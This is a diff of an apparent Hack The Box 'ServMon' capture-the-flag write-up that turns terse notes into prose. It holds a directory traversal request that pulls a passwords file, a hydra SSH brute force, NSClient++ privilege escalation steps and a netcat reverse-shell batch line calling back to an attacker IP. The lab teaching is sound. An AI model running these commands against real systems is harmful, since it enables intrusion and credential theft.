@@ -256,7 +256,7 @@ Nadine
 
 The file `Confidential.txt` in `Nadine`'s folder gave me some more good news.  She left `Nathan` a file on his desktop that looks to contain passwords.  This may be one of the "secret files" that `Nathan` was planning to lock up in SharePoint that he hadn't gotten to yet. 
 
-### HTTP - Port 80
+### HTTP - Port 80 🐇🐇
 
 Since I still didn't have a way in, the next place to enumerate was HTTP on port 80.  Navigating to `http://10.10.10.181` redirected to `http://10.10.10.184/Pages/login.htm` which had a page title of `NVMS-1000`.  This looks like the page with public access that `Nathan`'s to-do list had mentioned.  
 
@@ -266,15 +266,19 @@ Since I still didn't have a way in, the next place to enumerate was HTTP on port
 
 A quick exploit search using `searchsploit nvms 1000` found a directory traversal exploit for this web portal at [https://www.exploit-db.com/exploits/47774](https://www.exploit-db.com/exploits/47774), and also a Metasploit scanner to check for this vulnerability at [https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt\_nvms\_traversal](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tvt_nvms_traversal).  
 
+_Bypassing the login to this portal is possible, but I'm pretty sure it is a huge rabbit hole that sucked me in for quite awhile._
+
 ## Initial Foothold
 
 Can use GET requests and directory traversal to access files on the system.  Blog from Rapid7 shows good way to test for LFI and directory traversal for Windows. since we know the location of the `Passwords.txt` file, use this to exfiltrate
 
 {% embed url="https://blog.rapid7.com/2016/07/29/pentesting-in-the-real-world-local-file-inclusion-with-windows-server-files/" %}
 
-Burp suite
+I used Burp suite's repeater tool to craft my requests and test for this vulnerability on this machine.
 
 ![Checking for LFI through directory traversal](../.gitbook/assets/screenshot_2020-06-20_20-53-48.png)
+
+The machine was indeed vulnerable, and I used the information from the message `Nadine` left for `Nathan` to form my directory traversal GET request.  The server returned a list of seven passwords for me try out.
 
 ```text
 GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
@@ -307,7 +311,7 @@ Gr4etN3w5w17hMySk1Pa5$
 
 ## Road to User
 
-now lets try to login to ssh as `Nathan` and `Nadine`.
+Now that I had some credentials, it was time to try to log into the machine with them.  I decided to use the tool`hydra` to do a brute force attack against SSH for both users `Nathan` and `Nadine`.
 
 ```text
 zweilos@kalimaa:~/htb/servmon$ hydra -l Nadine -P passwords 10.10.10.184 ssh
@@ -323,7 +327,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-06-20 21:06:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-06-20 21:07:01
 ```
 
-thanks `Nadine` for using the same password you recommended!
+Thank you `Nadine` for using one of the same passwords you recommended!
 
 ```text
 zweilos@kalimaa:~/htb/servmon$ ssh Nadine@10.10.10.184
@@ -381,6 +385,8 @@ SeTimeZonePrivilege           Change the time zone                 Enabled
 nadine@SERVMON C:\Users\Nadine>
 ```
 
+After determining the correct password I easily logged in and got a shell as `Nadine`.  
+
 ### user.txt
 
 ```text
@@ -410,9 +416,11 @@ As you can see in this output, there were at least a few different people workin
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User Nadine
+### Enumeration as User `Nadine`
 
-C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost\_history.txt Nothing relevant...lots of attempts to do things from other users though!
+I was able to find a PowerShell history file for `Nadine` at C:\Users\Nadine\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost\_history.txt, though there was nothing relevant to the challenge..._there were however, lots of attempts to do things \(some quite humorous!\) from other users though!  Unfortunately I accidentally deleted the contents while cleaning up my notes for publishing so you can't enjoy them too._
+
+After browsing through the installed programs I came across something I didn't recognize: `NSClient++`.  
 
 ```text
 nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
@@ -426,6 +434,8 @@ nadine@SERVMON C:\Program Files\NSClient++>type changelog.txt
 
 ...snipped for brevity...
 ```
+
+The changelog didn't really hold any information that seemed useful at first, though it did give me an idea of how long it had been since the program had received an update: 2018-01-18. 
 
 ```text
 nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
@@ -467,11 +477,13 @@ they will be expanded by scripts placed under the wrapped scripts section. %SCRI
 bat = scripts\\%SCRIPT% %ARGS%
 ```
 
+I found a potential password in the `nsclient.ini` folder, though I wasn't sure what it might go to.  It didn't work for the Administrator account, unfortunately.  Near the bottom of this file were some obvious edits by other users, so I knew this had to be important.  I reset the box to avoid spoiling the rest of it for myself. 
+
 ### NSClient++ Exploit Research
 
-A Google search of nsclient++ and changelog leads to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where we can correlate the dates in the changelog.ini with the versions of the program's releases.  It seems as if we are on nightly build version 0.5.2.31 from 2018-01-18. 
+A Google search of `nsclient++ changelog` led to [http://www.nsclient.org/download/0.5.2/](http://www.nsclient.org/download/0.5.2/), where I was able to correlate the dates in the `changelog.txt` with the versions of the program's releases.  It looked like the installed program was nightly build version 0.5.2.31 from 2018-01-18. 
 
-Again, a quick Searchsploit check found an exploit that might work for this version.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
+Again, a quick `Searchsploit` check found an exploit that might work for this version of `NSClient++`.  [https://www.exploit-db.com/exploits/46802](https://www.exploit-db.com/exploits/46802)
 
 ```text
 Exploit Author: bzyo
@@ -551,7 +563,7 @@ The vulnerability allows local attackers to escalate privileges and execute
 arbitrary code as Local System
 ```
 
-
+Well this didn't look too awfully complicated.  I now had step-by-step instructions for privilege escalation all the way to `nt authority\system`.  
 
 ```text
 nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display 
@@ -559,14 +571,9 @@ nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
 Current password: ew2x6SsGTxjRwXOT
 ```
 
+Running the command in the exploit to get the NSCP web client administrator password gave me the same password that I had seen in the `nsclient.ini` file.  
 
-
-```text
-#@echo off
-c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
-```
-
-When logging in, it was found that the login failed. After research, it was found that nsclient.ini would allow access the Web interface only from the specified host. \(127.0.0.1 in this case\)
+Looking back through my notes, I saw that there was a port I hadn't checked out yet from my early Nmap scan.  Port TCP 8443 showed a website with the information `http-title: NSClient++`.  Navigating to `http://10.10.10.184:8443` resulted in failure.  After doing a bit more looking around I found an entry in `nsclient.ini` that seemed to specify that the Web interface could only be accessed from the specified hosts, which only included 127.0.0.1 in this case.  
 
 #### Using SSH to create a redirect tunnel \(Local Port Forwarding\)
 
@@ -583,6 +590,11 @@ When logging in, it was found that the login failed. After research, it was foun
 [https://docs.nsclient.org/api/](https://docs.nsclient.org/api/)
 
 
+
+```text
+#@echo off
+c:\Temp\nc.exe 10.10.14.15 4443 -e cmd.exe
+```
 
 nadine@SERVMON C:\Users\Nadine&gt;curl -k -u admin [https://localhost:8443/api/v1](https://localhost:8443/api/v1) Enter host password for user 'admin': curl: \(7\) Failed to connect to localhost port 8443: Connection refused
 
